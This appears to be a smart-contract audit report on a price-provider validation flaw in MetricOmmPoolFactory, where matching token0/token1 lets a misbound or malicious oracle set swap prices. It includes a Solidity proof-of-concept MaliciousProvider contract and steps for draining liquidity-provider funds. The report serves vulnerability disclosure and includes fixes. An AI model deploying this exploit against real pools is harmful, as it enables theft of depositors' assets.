### Title
Pool Factory Accepts Any `IPriceProvider` Whose `token0`/`token1` Match, Allowing a Misbound or Fully Malicious Provider to Drive Pool Swaps at Arbitrary Prices — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory._validatePriceProvider()` only checks that the provider's `token0()` and `token1()` return values match the pool's token addresses. It does not verify that the provider was deployed by an approved factory, that the underlying oracle is legitimate, or that the feed ID actually prices the declared token pair. Because both `PriceProviderFactory.createPriceProvider()` and pool creation are permissionless, an attacker can supply a provider whose token metadata is correct but whose oracle feed (or entire price logic) is attacker-controlled, causing every swap in the pool to execute at an arbitrary price and draining LP principal.

---

### Finding Description

The sole price-provider guard in the pool factory is:

```solidity
// metric-core/contracts/MetricOmmPoolFactory.sol
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
        revert PriceProviderTokenMismatch();
    }
}
``` [1](#0-0) 

This check is satisfied by any contract that returns the correct addresses from `token0()` and `token1()`. It does not verify:

- That the provider was deployed by an approved `PriceProviderFactory` or `AnchoredProviderFactory`.
- That the underlying oracle address is legitimate or approved.
- That the `offchainFeedId` stored in the provider actually prices `baseToken / quoteToken`.

`PriceProviderFactory.createPriceProvider()` is explicitly permissionless — any caller may deploy a `PriceProvider` with an arbitrary oracle address and arbitrary feed ID, as long as `_baseToken != address(0)` and `_baseToken != _quoteToken`:

```solidity
// smart-contracts-poc/contracts/PriceProviderFactory.sol
function createPriceProvider(
    address _oracle,
    bytes32 _feedId,
    int256  _marginStep,
    uint256 _maxTimeDelta,
    address _baseToken,
    address _quoteToken
) external override returns (address provider) {
    PriceProvider p = new PriceProvider(
        address(this), _oracle, _feedId, _marginStep, _maxTimeDelta, _baseToken, _quoteToken
    );
    ...
}
``` [2](#0-1) 

The `PriceProvider` constructor's only token validation is:

```solidity
require(_baseToken != address(0) && _quoteToken != address(0) && _baseToken != _quoteToken);
``` [3](#0-2) 

No check binds `_feedId` to `_baseToken`/`_quoteToken`. An attacker can therefore deploy a `PriceProvider` with `baseToken = WETH`, `quoteToken = USDC`, but `feedId = BTC/USD`. The factory's `_validatePriceProvider` passes (tokens match), and the pool is created. Every subsequent swap reads BTC/USD prices for an ETH/USDC pool.

Alternatively, the attacker can skip the factory entirely and deploy a bespoke contract implementing `IPriceProvider` that returns correct `token0()`/`token1()` but returns attacker-chosen bid/ask values from `getBidAndAskPrice()`. The pool factory accepts it identically.

The swap path consumes the provider output without any further validation:

```solidity
// metric-core/contracts/MetricOmmPool.sol
(uint128 bidPriceX64, uint128 askPriceX64) = _getBidAndAskPriceX64();
(uint256 midPriceX64, uint256 baseFeeX64) =
    SwapMath.midAndSpreadFeeX64FromBidAsk(uint256(bidPriceX64), uint256(askPriceX64));
``` [4](#0-3) 

Whatever bid/ask the provider returns becomes the mid-price and spread that govern every bin traversal and token settlement in the swap.

---

### Impact Explanation

**Direct loss of LP principal.** An attacker who creates a pool with a misbound or malicious provider can execute swaps at prices far from fair value. For example, with a BTC/USD feed driving an ETH/USDC pool, the attacker can buy ETH at a price 10–20× below market (BTC price >> ETH price) or sell ETH at a price 10–20× above market, extracting the full token balance of the pool in a single swap. LPs who added liquidity cannot recover their principal because the pool's bin accounting settles at the wrong price. This is a direct, irreversible loss of user-deposited assets above any Sherlock threshold.

---

### Likelihood Explanation

Pool creation and provider creation are both permissionless. The attacker needs no special role, no flash loan, and no cooperation from any privileged party. The only cost is gas. The attack is repeatable across any token pair for which a mismatched feed exists on the oracle. Likelihood is **high**.

---

### Recommendation

1. **Require providers to originate from an approved factory.** Maintain an `approvedProviderFactory` set in `MetricOmmPoolFactory` and reject any `priceProvider` not tracked by one of those factories (`IPriceProviderFactory(factory).isProvider(priceProvider)`).

2. **Alternatively, maintain an approved-provider allowlist** in the pool factory (admin-curated), and reject any provider not on it.

3. **For `AnchoredProviderFactory`**, the oracle allowlist (`_oracles.contains(oracle)`) already blocks unapproved oracles, but the feed-to-token binding is still unchecked. Consider storing a `feedToken[feedId]` mapping and asserting `feedToken[baseFeedId] == baseToken` at provider creation.

4. **Do not rely solely on `token0()`/`token1()` return values** from an untrusted contract as proof of correct price binding — those values are self-reported and trivially spoofable.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IPriceProvider} from "@metric-core/interfaces/IPriceProvider/IPriceProvider.sol";

/// Step 1: Attacker deploys a malicious provider with correct token metadata
///         but returning attacker-chosen prices.
contract MaliciousProvider is IPriceProvider {
    address public immutable token0_; // = WETH (matches pool)
    address public immutable token1_; // = USDC (matches pool)
    uint128 public bid;
    uint128 public ask;

    constructor(address _t0, address _t1, uint128 _bid, uint128 _ask) {
        token0_ = _t0; token1_ = _t1; bid = _bid; ask = _ask;
    }
    function token0() external view returns (address) { return token0_; }
    function token1() external view returns (address) { return token1_; }
    // Returns attacker-chosen price — e.g., 1 USDC per WETH (true price ~3000)
    function getBidAndAskPrice() external view returns (uint128, uint128) {
        return (bid, ask);
    }
}

// Step 2: Attacker calls MetricOmmPoolFactory.createPool(params) where
//         params.priceProvider = address(new MaliciousProvider(WETH, USDC, 1<<64, 2<<64))
//         Factory's _validatePriceProvider passes: token0()==WETH, token1()==USDC ✓

// Step 3: LPs add liquidity to the new pool (e.g., attracted by a favorable initial bin).

// Step 4: Attacker calls pool.swap(zeroForOne=false, ...) — buys WETH at 1 USDC
//         (the malicious provider's ask price). Pool pays out WETH at 1/3000th of
//         fair value. LP principal is drained.
```

The `_validatePriceProvider` check at line 543 passes for `MaliciousProvider` because `token0()` returns `WETH` and `token1()` returns `USDC`, matching the pool parameters. No further on-chain guard intercepts the malicious bid/ask before it reaches `SwapMath`. [1](#0-0) [4](#0-3) [2](#0-1)

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** smart-contracts-poc/contracts/PriceProviderFactory.sol (L41-76)
```text
    function createPriceProvider(
        address _oracle,
        bytes32 _feedId,
        int256  _marginStep,
        uint256 _maxTimeDelta,
        address _baseToken,
        address _quoteToken
    ) external override returns (address provider) {
        PriceProvider p = new PriceProvider(
            address(this),
            _oracle,
            _feedId,
            _marginStep,
            _maxTimeDelta,
            _baseToken,
            _quoteToken
        );

        provider = address(p);
        address creator = msg.sender;

        _providers.add(provider);
        _providersByCreator[creator].add(provider);
        providerOwner[provider] = creator;

        emit ProviderDeployed(
            provider,
            creator,
            _feedId,
            _oracle,
            p.baseToken(),
            p.quoteToken(),
            _marginStep,
            _maxTimeDelta
        );
    }
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L76-76)
```text
        require(_baseToken != address(0) && _quoteToken != address(0) && _baseToken != _quoteToken);
```

**File:** metric-core/contracts/MetricOmmPool.sol (L228-243)
```text
    (uint128 bidPriceX64, uint128 askPriceX64) = _getBidAndAskPriceX64();

    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );

    (uint256 midPriceX64, uint256 baseFeeX64) =
      SwapMath.midAndSpreadFeeX64FromBidAsk(uint256(bidPriceX64), uint256(askPriceX64));
```
